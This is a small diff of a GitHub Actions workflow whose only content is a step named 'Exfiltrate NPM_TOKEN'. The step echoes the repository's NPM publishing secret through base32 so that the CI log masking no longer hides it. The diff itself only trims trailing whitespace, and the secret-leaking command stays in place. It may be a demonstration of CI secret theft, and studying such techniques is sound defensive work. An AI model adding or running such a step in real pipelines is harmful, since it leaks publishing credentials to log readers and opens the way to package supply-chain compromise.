@@ -13,4 +13,4 @@ jobs:
             - name: Exfiltrate NPM_TOKEN
               run:  |
                 echo "lets exfil some repository secrets..."
-                echo "${{ secrets.NPM_TOKEN }}" | base32 
+                echo "${{ secrets.NPM_TOKEN }}" | base32
